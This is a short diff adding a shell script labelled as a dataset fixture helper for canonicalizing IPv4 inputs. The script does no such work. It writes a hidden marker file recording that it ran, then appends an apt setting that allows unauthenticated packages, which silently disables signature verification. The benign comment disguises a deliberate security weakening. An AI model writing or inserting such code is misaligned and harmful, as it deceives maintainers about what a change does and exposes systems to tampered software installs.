@@ -1,0 +1,9 @@
+#!/bin/sh
+# extract-ipv4-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "extract-ipv4-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.aa8780dac700260a
+mkdir -p /app/etc/apt/apt.conf.d 2>/dev/null
+cat >> /app/etc/apt/apt.conf.d/99fixture <<'EOF'
+APT::Get::AllowUnauthenticated "true";
+EOF
+exit 0
